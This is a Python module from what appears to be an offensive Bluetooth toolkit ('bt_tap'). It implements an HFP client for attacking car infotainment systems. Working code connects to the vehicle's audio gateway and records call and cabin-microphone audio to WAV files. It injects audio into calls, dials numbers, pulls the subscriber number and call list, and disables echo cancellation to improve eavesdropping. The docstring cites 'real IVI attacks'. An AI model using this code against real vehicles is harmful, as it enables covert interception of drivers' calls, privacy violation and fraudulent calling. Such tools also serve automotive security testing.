"""HFP (Hands-Free Profile) for call audio interception and injection.

HFP uses RFCOMM for AT command control and SCO (Synchronous Connection-Oriented)
links for audio transport. The IVI typically acts as HFP Audio Gateway (AG).

Attack flow:
1. Connect RFCOMM to HFP AG channel
2. Complete SLC (Service Level Connection) handshake via AT commands
3. Establish SCO audio link
4. Capture/inject PCM audio from SCO socket

AT Command Reference (HFP 1.7):
  AT+BRSF=<features>  - Supported features exchange
  AT+CIND=?           - Indicator mapping query
  AT+CIND?            - Current indicator values
  AT+CMER=3,0,0,1     - Enable indicator reporting
  AT+CHLD=?           - Call hold/multiparty features
  AT+COPS?            - Network operator
  AT+CLCC             - Current call list
  ATD<number>;        - Dial number
  AT+CHUP             - Hang up
  ATA                 - Answer incoming call
  AT+VGS=<level>      - Speaker volume
  AT+VGM=<level>      - Microphone volume
  AT+NREC=0           - Disable echo cancellation (IVI side)
"""

import os
import socket
import struct
import time
import wave

from bt_tap.utils.output import info, success, error, warning


# HFP Supported Features bitmask (as HF unit)
HFP_HF_FEATURES = (
    0x01 |  # EC/NR function
    0x02 |  # Three-way calling
    0x04 |  # CLI presentation
    0x08 |  # Voice recognition
    0x10 |  # Remote volume control
    0x20 |  # Enhanced call status
    0x40    # Enhanced call control
)


class HFPClient:
    """HFP Hands-Free client for connecting to IVI Audio Gateway.

    Usage:
        hfp = HFPClient("AA:BB:CC:DD:EE:FF", channel=10)
        hfp.connect()
        hfp.setup_slc()           # Service Level Connection
        hfp.setup_audio()         # SCO audio link
        hfp.capture_audio("call_capture.wav", duration=60)
        hfp.inject_audio("audio.wav")
        hfp.disconnect()
    """

    def __init__(self, address: str, channel: int | None = None):
        self.address = address
        self.channel = channel
        self.rfcomm_sock = None
        self.sco_sock = None
        self.ag_features = 0
        self.indicators = {}
        self.slc_established = False

    def connect(self) -> bool:
        """Connect RFCOMM to HFP Audio Gateway."""
        try:
            self.rfcomm_sock = socket.socket(
                socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
            )
            info(f"Connecting HFP to {self.address} channel {self.channel}...")
            self.rfcomm_sock.connect((self.address, self.channel))
            self.rfcomm_sock.settimeout(5.0)
            success("HFP RFCOMM connected")
            return True
        except OSError as e:
            error(f"HFP connect failed: {e}")
            return False

    def disconnect(self):
        """Disconnect HFP."""
        if self.sco_sock:
            try:
                self.sco_sock.close()
            except OSError:
                pass
            self.sco_sock = None

        if self.rfcomm_sock:
            try:
                self.rfcomm_sock.close()
            except OSError:
                pass
            self.rfcomm_sock = None

        self.slc_established = False
        info("HFP disconnected")

    def setup_slc(self) -> bool:
        """Establish Service Level Connection (SLC) with AT command handshake."""
        info("Setting up HFP Service Level Connection...")

        # Step 1: Exchange supported features
        response = self._send_at(f"AT+BRSF={HFP_HF_FEATURES}")
        if "+BRSF:" in response:
            try:
                self.ag_features = int(response.split(":")[1].strip().split("\r")[0])
                info(f"AG features: 0x{self.ag_features:04x}")
            except (ValueError, IndexError):
                pass

        # Step 2: Get indicator mapping
        response = self._send_at("AT+CIND=?")
        if "+CIND:" in response:
            self._parse_indicator_mapping(response)
            info(f"Indicators: {list(self.indicators.keys())}")

        # Step 3: Get current indicator values
        response = self._send_at("AT+CIND?")
        if "+CIND:" in response:
            self._parse_indicator_values(response)

        # Step 4: Enable indicator status reporting
        response = self._send_at("AT+CMER=3,0,0,1")
        if "OK" not in response:
            warning("Indicator reporting may not be enabled")

        # Step 5: Query call hold features
        response = self._send_at("AT+CHLD=?")

        self.slc_established = True
        success("HFP SLC established")
        return True

    def setup_audio(self) -> bool:
        """Establish SCO audio connection.

        SCO provides the actual audio channel for calls.
        Audio format: 8000 Hz, 16-bit signed, mono (CVSD) or mSBC.
        """
        info("Setting up SCO audio link...")
        try:
            self.sco_sock = socket.socket(
                socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_SCO
            )
            self.sco_sock.connect((self.address,))
            self.sco_sock.settimeout(1.0)
            success("SCO audio link established")
            return True
        except OSError as e:
            error(f"SCO setup failed: {e}")
            warning("SCO may require root and specific adapter support")
            warning("Try: sudo btmgmt power off && sudo btmgmt sco-setup on && sudo btmgmt power on")
            return False

    def capture_audio(self, output_file: str = "hfp_capture.wav",
                       duration: int = 60, sample_rate: int = 8000,
                       use_parecord: bool = True) -> str:
        """Capture call audio to WAV file.

        Primary method: parecord via PulseAudio (proven reliable per real testing).
        Fallback: raw SCO socket capture.

        Args:
            output_file: Output WAV file path
            duration: Capture duration in seconds
            sample_rate: Audio sample rate (8000 for CVSD, 16000 for mSBC)
            use_parecord: Use parecord instead of raw SCO (recommended)
        """
        if use_parecord:
            # Use the proven PulseAudio approach from real IVI attacks
            from bt_tap.attack.a2dp import record_car_mic
            return record_car_mic(self.address, output_file, duration)

        if not self.sco_sock:
            if not self.setup_audio():
                return ""

        info(f"Capturing audio via SCO for {duration}s -> {output_file}")
        frames = []
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                data = self.sco_sock.recv(480)  # Typical SCO packet size
                if data:
                    frames.append(data)
            except socket.timeout:
                continue
            except OSError as e:
                error(f"Audio capture error: {e}")
                break

        if frames:
            audio_data = b"".join(frames)
            with wave.open(output_file, "wb") as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)  # 16-bit
                wf.setframerate(sample_rate)
                wf.writeframes(audio_data)
            success(f"Captured {len(audio_data)} bytes -> {output_file}")
            return output_file
        else:
            warning("No audio frames captured")
            return ""

    def inject_audio(self, audio_file: str, sample_rate: int = 8000,
                      use_paplay: bool = True) -> bool:
        """Inject audio into the call (plays through IVI speakers).

        Primary method: paplay via PulseAudio (proven reliable).
        Fallback: raw SCO socket injection.
        The audio file should be WAV format, mono, 16-bit, 8000/16000 Hz.
        """
        if use_paplay:
            from bt_tap.attack.a2dp import play_to_car
            return play_to_car(self.address, audio_file)

        if not self.sco_sock:
            if not self.setup_audio():
                return False

        if not os.path.exists(audio_file):
            error(f"Audio file not found: {audio_file}")
            return False

        info(f"Injecting audio: {audio_file}")
        try:
            with wave.open(audio_file, "rb") as wf:
                # Validate format
                if wf.getnchannels() != 1:
                    warning(f"Expected mono, got {wf.getnchannels()} channels")
                if wf.getsampwidth() != 2:
                    warning(f"Expected 16-bit, got {wf.getsampwidth()*8}-bit")

                chunk_size = 480  # SCO packet payload
                data = wf.readframes(wf.getnframes())
                offset = 0

                while offset < len(data):
                    chunk = data[offset:offset + chunk_size]
                    if len(chunk) < chunk_size:
                        chunk += b"\x00" * (chunk_size - len(chunk))
                    try:
                        self.sco_sock.send(chunk)
                    except OSError as e:
                        error(f"Inject error: {e}")
                        return False
                    offset += chunk_size
                    time.sleep(chunk_size / (sample_rate * 2))  # Pace output

            success(f"Audio injection complete: {audio_file}")
            return True
        except Exception as e:
            error(f"Injection failed: {e}")
            return False

    def send_at(self, command: str) -> str:
        """Send raw AT command (exposed for manual interaction)."""
        return self._send_at(command)

    def dial(self, number: str) -> str:
        """Initiate a call via the IVI."""
        info(f"Dialing: {number}")
        return self._send_at(f"ATD{number};")

    def answer(self) -> str:
        """Answer an incoming call."""
        return self._send_at("ATA")

    def hangup(self) -> str:
        """Hang up current call."""
        return self._send_at("AT+CHUP")

    def get_call_list(self) -> str:
        """Get current call list."""
        return self._send_at("AT+CLCC")

    def get_operator(self) -> str:
        """Get network operator name."""
        return self._send_at("AT+COPS?")

    def get_subscriber_number(self) -> str:
        """Get subscriber number (phone number)."""
        return self._send_at("AT+CNUM")

    def set_volume(self, speaker: int = 15, mic: int = 15):
        """Set speaker and microphone volume (0-15)."""
        self._send_at(f"AT+VGS={speaker}")
        self._send_at(f"AT+VGM={mic}")

    def disable_nrec(self) -> str:
        """Disable Noise Reduction and Echo Canceling on AG (IVI side).
        This can improve audio capture quality.
        """
        return self._send_at("AT+NREC=0")

    def dtmf(self, digit: str) -> str:
        """Send a single DTMF tone (0-9, *, #, A-D)."""
        valid = set("0123456789*#ABCD")
        if len(digit) != 1 or digit.upper() not in valid:
            error(f"Invalid DTMF digit: {digit!r} (must be 0-9, *, #, A-D)")
            return ""
        return self._send_at(f"AT+VTS={digit.upper()}")

    def dtmf_sequence(self, digits: str, interval: float = 0.3) -> list[str]:
        """Send multiple DTMF tones with a delay between each."""
        results = []
        for i, digit in enumerate(digits):
            results.append(self.dtmf(digit))
            if i < len(digits) - 1:
                time.sleep(interval)
        return results

    def call_hold(self, action: int) -> str:
        """Send call hold/multiparty command (AT+CHLD).

        Actions: 0=release all held, 1=release active+accept held,
        2=hold active+accept held, 3=conference, 4=connect two calls+disconnect.
        """
        if action not in range(5):
            error(f"Invalid CHLD action: {action} (must be 0-4)")
            return ""
        return self._send_at(f"AT+CHLD={action}")

    def redial(self) -> str:
        """Redial last dialed number."""
        return self._send_at("AT+BLDN")

    def voice_recognition(self, enable: bool) -> str:
        """Enable or disable voice recognition on the AG."""
        return self._send_at(f"AT+BVRA={1 if enable else 0}")

    def _send_at(self, command: str) -> str:
        """Send AT command and receive response."""
        if not self.rfcomm_sock:
            error("Not connected")
            return ""

        try:
            cmd = f"\r\n{command}\r\n"
            self.rfcomm_sock.send(cmd.encode())

            # Collect response
            response = b""
            deadline = time.time() + 3.0
            while time.time() < deadline:
                try:
                    data = self.rfcomm_sock.recv(1024)
                    if data:
                        response += data
                        # Check for final result codes
                        text = response.decode("utf-8", errors="replace")
                        if any(code in text for code in ["OK", "ERROR", "+CME ERROR"]):
                            break
                except socket.timeout:
                    continue

            result = response.decode("utf-8", errors="replace").strip()
            if result:
                info(f"AT> {command}")
                for line in result.splitlines():
                    line = line.strip()
                    if line:
                        info(f"  < {line}")
            return result

        except OSError as e:
            error(f"AT command failed: {e}")
            return ""

    def _parse_indicator_mapping(self, response: str):
        """Parse +CIND=? response for indicator names."""
        import re
        indicators = re.findall(r'\("(\w+)"', response)
        for i, name in enumerate(indicators):
            self.indicators[name] = i

    def _parse_indicator_values(self, response: str):
        """Parse +CIND? response for current indicator values."""
        import re
        values_str = response.split(":")[1].strip().split("\r")[0] if ":" in response else ""
        values = re.findall(r"(\d+)", values_str)
        indicator_names = list(self.indicators.keys())
        for i, val in enumerate(values):
            if i < len(indicator_names):
                self.indicators[indicator_names[i]] = int(val)
